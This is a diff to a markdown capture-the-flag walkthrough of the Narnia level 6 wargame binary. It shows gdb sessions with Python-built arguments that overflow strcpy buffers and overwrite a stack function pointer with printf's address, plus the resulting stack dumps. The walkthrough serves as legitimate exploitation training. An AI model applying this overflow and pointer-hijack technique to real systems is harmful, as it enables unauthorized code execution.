@@ -111,6 +111,18 @@ Program received signal SIGSEGV, Segmentation fault.
 >
 > We can see that the function pointer is saving the address ```0x80483f0``` to the stack.  Let's move to gdb and see if we can actually get the memory address where the function pointer is pointing to.
 >
+>```
+(gdb) run $(python -c 'print "A"*8') $(python -c 'print "B"*8')
+Starting program: /root/narnia6 $(python -c 'print "A"*8') $(python -c 'print "B"*8')
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
+>
+Breakpoint 1, 0x08048563 in main ()
+(gdb) print $esp+0x28
+$1 = (void *) 0xffffd4e8
+>```
+>
+> Looks like the address on the stack that we need to try to overwrite is ```0xffffd4e8```.  Let's move to our actual input.
+>
 >```asm
 08048657         mov        eax, dword [ss:ebp+arg_4]
 0804865a         add        eax, 0x4
@@ -133,7 +145,87 @@ Program received signal SIGSEGV, Segmentation fault.
 08048697         cmp        ebx, eax
 08048699         jne        0x80486a7
 >```
+>
+> Both parameters that get submitted are run through ```strcpy```.  Let's go back to gdb and set a breakpoint just after the second ```stfcpy``` and examine the stack.
+>
+>```
+(gdb) run $(python -c 'print "A"*8') $(python -c 'print "B"*8')
+Starting program: /root/narnia6 $(python -c 'print "A"*8') $(python -c 'print "B"*8')
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
+>
+Breakpoint 1, 0x08048687 in main ()
+(gdb) x/50x $esp
+0xffffd4c0:	0xffffd4d8	0xffffd709	0x00000036	0x08048712
+0xffffd4d0:	0x00000003	0xffffd5a4	0x42424242	0x42424242
+0xffffd4e0:	0x41414100	0x41414141	0x08048300	0x00000003
+0xffffd4f0:	0x080486c0	0xf7fb6ff4	0xffffd578	0xf7e6de46
+0xffffd500:	0x00000003	0xffffd5a4	0xffffd5b4	0xf7fdb860
+0xffffd510:	0xf7ff4821	0xffffffff	0xf7ffcff4	0x080482d0
+0xffffd520:	0x00000001	0xffffd560	0xf7fedc16	0xf7ffdac0
+0xffffd530:	0xf7fdbb58	0xf7fb6ff4	0x00000000	0x00000000
+0xffffd540:	0xffffd578	0x7e999ad7	0x4c8f8cc7	0x00000000
+0xffffd550:	0x00000000	0x00000000	0x00000003	0x08048450
+0xffffd560:	0x00000000	0xf7ff39c0	0xf7e6dd6b	0xf7ffcff4
+0xffffd570:	0x00000003	0x08048450	0x00000000	0x08048471
+0xffffd580:	0x08048559	0x00000003
+>```
+>
+> Ah, things appear to be coming together.  We can see that our input stops right before ```0xffffd4e8```, the address we want to try and overwrite.  Maybe we should try adding 4 more characters to our input.
+>
+>```
+(gdb) run $(python -c 'print "A"*12') $(python -c 'print "B"*8')
+Starting program: /root/narnia6 $(python -c 'print "A"*12') $(python -c 'print "B"*8')
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
+>
+Breakpoint 1, 0x08048687 in main ()
+(gdb) x/50x $esp
+0xffffd4b0:	0xffffd4c8	0xffffd709	0x00000036	0x08048712
+0xffffd4c0:	0x00000003	0xffffd594	0x42424242	0x42424242
+0xffffd4d0:	0x41414100	0x41414141	0x41414141	0x00000000
+0xffffd4e0:	0x080486c0	0xf7fb6ff4	0xffffd568	0xf7e6de46
+0xffffd4f0:	0x00000003	0xffffd594	0xffffd5a4	0xf7fdb860
+0xffffd500:	0xf7ff4821	0xffffffff	0xf7ffcff4	0x080482d0
+0xffffd510:	0x00000001	0xffffd550	0xf7fedc16	0xf7ffdac0
+0xffffd520:	0xf7fdbb58	0xf7fb6ff4	0x00000000	0x00000000
+0xffffd530:	0xffffd568	0x26e0f5dc	0x14f503cc	0x00000000
+0xffffd540:	0x00000000	0x00000000	0x00000003	0x08048450
+0xffffd550:	0x00000000	0xf7ff39c0	0xf7e6dd6b	0xf7ffcff4
+0xffffd560:	0x00000003	0x08048450	0x00000000	0x08048471
+0xffffd570:	0x08048559	0x00000003
+>```
+>
+> Nice, it looks like we can control that address. Now we need to try and point to another function and see if our theory works in practice.  Looking through the binary the only thing that jumps out as an easy test is the ```printf``` function.
+>
 >```asm
              j_printf:
 080483d0         jmp        dword [ds:printf@GOT]                               ; printf@GOT, XREF=main+40
 >```
+>
+> Now we need to try and overwrite ```0xffffd4e8``` with ```0x080483d0```.
+>
+>```
+(gdb) run $(python -c 'print "A"*8+"\xd0\x83\x04\x08"') $(python -c 'print "B"*4')
+Starting program: /root/narnia6 $(python -c 'print "A"*8+"\xd0\x83\x04\x08"') $(python -c 'print "B"*4')
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
+>
+Breakpoint 1, 0x08048687 in main ()
+(gdb) x/50x $esp
+0xffffd4c0:	0xffffd4d8	0xffffd70d	0x00000036	0x08048712
+0xffffd4d0:	0x00000003	0xffffd5a4	0x42424242	0xffffd400
+0xffffd4e0:	0x41414141	0x41414141	0x080483d0	0x00000000
+0xffffd4f0:	0x080486c0	0xf7fb6ff4	0xffffd578	0xf7e6de46
+0xffffd500:	0x00000003	0xffffd5a4	0xffffd5b4	0xf7fdb860
+0xffffd510:	0xf7ff4821	0xffffffff	0xf7ffcff4	0x080482d0
+0xffffd520:	0x00000001	0xffffd560	0xf7fedc16	0xf7ffdac0
+0xffffd530:	0xf7fdbb58	0xf7fb6ff4	0x00000000	0x00000000
+0xffffd540:	0xffffd578	0x4ff74d8c	0x7de15b9c	0x00000000
+0xffffd550:	0x00000000	0x00000000	0x00000003	0x08048450
+0xffffd560:	0x00000000	0xf7ff39c0	0xf7e6dd6b	0xf7ffcff4
+0xffffd570:	0x00000003	0x08048450	0x00000000	0x08048471
+0xffffd580:	0x08048559	0x00000003
+(gdb) c
+Continuing.
+AAAAAAAAЃ[Inferior 1 (process 4288) exited with code 01]
+>```
+>
+> Wow. It worked. We can see the address overwritten ```0xffffd4e8``` with ```0x080483d0``` and then when we continue execution we see the results of ```fp(b1)```, which is our first parameter being printed via ```printf```.
